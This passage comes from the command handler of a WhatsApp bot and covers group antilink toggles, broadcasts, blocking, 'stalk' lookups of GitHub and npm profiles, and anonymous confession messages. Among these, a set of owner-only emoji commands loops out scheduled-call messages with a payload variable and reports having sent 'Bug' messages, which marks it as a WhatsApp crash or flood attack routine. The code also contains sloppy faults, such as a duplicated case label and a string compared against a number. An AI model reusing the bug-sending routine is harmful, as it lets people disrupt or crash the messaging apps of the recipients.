case 'npmstalk':{
if (!q) return replygcxeon(`Example ${prefix+command} xeonapi`)
replygcxeon(mess.wait)
eha = await npmstalk.npmstalk(q)
replygcxeon(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcxeon(`Example ${prefix+command} DGXeon`)
replygcxeon(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
Kyuu.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'ss': case 'ssweb': {
if (!q) return replygcxeon(`Example ${prefix+command} link`)
replygcxeon(mess.wait)
let krt = await scp1.ssweb(q)
Kyuu.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'join': {
if (!isOwner) return replygcxeon(mess.owner)
if (!text) return replygcxeon(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Kyuu.groupAcceptInvite(result).then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
}
break
case 'toonce': case 'toviewonce': { 
if (!quoted) return replygcxeon(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await Kyuu.downloadAndSaveMediaMessage(quoted)
Kyuu.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await Kyuu.downloadAndSaveMediaMessage(quoted)
Kyuu.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replygcxeon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
            case 'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 Kyuu.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await Kyuu.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 Kyuu.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                replygcxeon2(respon)
            }
            break
case 'autosticker':
if (!isOwner) return replygcxeon(mess.owner)
if (args[0] == 'on') {
if (autosticker) return replygcxeon('*Activated!*')
autosticker = true
replygcxeon('*Successfully Activated Autosticker*')
} else if (args[0] == 'off') {
if (!autosticker) return replygcxeon('*Not Yet Active!*')
autosticker = false
replygcxeon('*Successfully Turn off Autosticker*')
} else {
replygcxeon(`Type .autosticker on To Activate And .autosticker off To Deactivate`)
}
break
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!isOwner) return replygcxeon(mess.owner)
		            if (!q) return replygcxeon(`Enter text`)
		                            const data = await store.chats.all()
                            for (let i of data) {
                               Kyuu.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
                               await sleep(1000)
                            }
                            }
                            break
                            case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!isOwner) return replygcxeon(mess.owner)
        if (!q) return replygcxeon(`Enter text`)
        let getGroups = await Kyuu.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        replygcxeon(` Broadcasting in ${xeoncast.length} Group Chat, in ${xeoncast.length * 1.5} seconds`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await Kyuu.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await Kyuu.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replygcxeon(`Successfuly Broadcasted in ${xeoncast.length} Groups`)      
        break
case 'block': {
		if (!isOwner) return replygcxeon(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Kyuu.updateBlockStatus(users, 'block').then((res) => replygcxeon(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isOwner) return replygcxeon(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Kyuu.updateBlockStatus(users, 'unblock').then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replygcxeon(lisben)
	}
	break
case 'menfes': case 'confess':
if (!isPrem) return replyprem(mess.premium)
if (Object.values(anon.anonymous).find(p => p.check(sender))) return replygcxeon("Nomer ini tidak terdaftar di whatsapp!!")
if (m.isGroup) return replygcxeon(mess.private)
if (args.length < 1) return replygcxeon(`Use ${prefix+command} number|your message\nExample ${prefix+command} ${ownernumber}|Hi Owner`)
if (text > 700) return replygcxeon(`The text is too long`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = q.split('|')[1]
let cekno = await Kyuu.onWhatsApp(num)
if (cekno.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
if (num === m.sender) return replygcxeon(`Cannot Confess To Own Number!!!`)
if (num === botNumber) return replygcxeon(`Can't Confess to bot number!!!`)
var nomor = m.sender

const xeonconfesmsg = `Hi, I'm a bot. Someone sent a message to you.

Someone your friend
(Secret Sender)

-------------------------------------->

💌 Message : ${pesan}

-------------------------------------->`

await Kyuu.sendMessage(num,
{ text: xeonconfesmsg,
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": ``,
"sourceUrl": `${wagc}`}}}, {quoted:m})

await Kyuu.sendMessage(num, {text:`You can also reply to the message by sending a message, if you don't want to reply, please type .leave and enter send button`}, { quoted : m })
lidt = `Success Sending Message
👤 From : wa.me/${nomor.split("@s.whatsapp.net")[0]}
👥 To : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}

⬡──⬡─────────⬡──⬡

Your Message : ${pesan}

⬡──⬡─────────⬡──⬡`
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(sender, num)
console.log("[ CONFESS ] Creating room for: " + sender);
return replygcxeon(lidt)
}
break
case 'leave':{
if (m.isGroup && isOwner && command == "leave") return Kyuu.groupLeave(from)
if (m.isGroup) return replygcxeon("Only private chat")
var room = Object.values(anon.anonymous).find(p => p.check(sender))
if (!room) return replygcxeon("You are not in the room")
replygcxeon("Bye...")
var other = room.other(sender)
delete anon.anonymous[room.id]
if (other != "") Kyuu.sendMessage(other, {
text: "Bye..."
})
if (command == "leave") break;
}
case 'afk': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!text) return replygcxeon(`Example ${prefix+command} want to sleep`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
replygcxeon(`${m.pushName} Has Gone AFK\nReason : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
Kyuu.groupRevokeInvite(m.chat)
}
break
            case 'react': {
                if (!isOwner) return replygcxeon(mess.owner)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                Kyuu.sendMessage(m.chat, reactionMessage)
            }
            break
case 'group': case 'editinfo': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!q) return replygcxeon(`Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`)
if (args[0] == 'close') {
Kyuu.groupSettingUpdate(from, 'announcement')
replygcxeon(`Success Allows Only Admins To Send Messages To This Group`)
} else if (args[0] == 'open') {
Kyuu.groupSettingUpdate(from, 'not_announcement')
replygcxeon(`Success Allows All Participants To Send Messages To This Group`)
} else {
replygcxeon(`Type Command ${command} _pptions_\nOptions : Close & Open\nExample : ${command} close`)
}}
break
case 'autostickergc':
            case 'autosticker':
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args.length < 1) return replygcxeon('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return replygcxeon(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcxeon('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcxeon('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (antiVirtex) return replygcxeon('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcxeon('Success in turning on antivirus in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replygcxeon('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcxeon('Success in turning off antivirus this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'nsfw': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return replygcxeon('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcxeon('Success in turning on nsfw in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcxeon('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcxeon('Success in turning off nsfw in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replygcxeon('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcxeon('Success in turning on youtube video antilink in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replygcxeon('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcxeon('Success in turning off youtube video antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replygcxeon('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replygcxeon('Success in turning on youtube channel antilink in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replygcxeon('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replygcxeon('Success in turning off youtube channel antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return replygcxeon('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcxeon('Success in turning on instagram antilink in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replygcxeon('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcxeon('Success in turning off instagram antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
        case '🥶': case '😱': case '🤣': case '😂': case '😘': case '💔': case '👊': {
if (!isOwner) return replygcxeon('*khusus Premium*')
if (!args[0]) return replygcxeon(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Kyuu.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon2(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return replygcxeon('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcxeon('Success in turning on facebook antilink in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replygcxeon('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcxeon('Success in turning off facebook antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return replygcxeon('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcxeon('Success in turning on telegram antilink in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replygcxeon('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcxeon('Success in turning off telegram antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return replygcxeon('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcxeon('Success in turning on tiktok antilink in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replygcxeon('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcxeon('Success in turning off tiktok antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcxeon('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcxeon('Success in turning on twitter antilink in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replygcxeon('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcxeon('Success in turning off twitter antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case  'qcstick':{
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await Kyuu.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await Kyuu.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await Kyuu.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 
              case 'antilinkall': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcxeon('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcxeon('Success in turning on all antilink in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replygcxeon('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcxeon('Success in turning off all antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antitoxic': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (antiToxic) return replygcxeon('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcxeon('Success in turning on antitoxic in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replygcxeon('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcxeon('Success in turning off antitoxic in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !isOwner) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (antiWame) return replygcxeon('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcxeon('Success in turning on antiwame in this group')
var groupe = await Kyuu.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyuu.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replygcxeon('Already deactivated')
let off = nttoxic.indexOf(from)
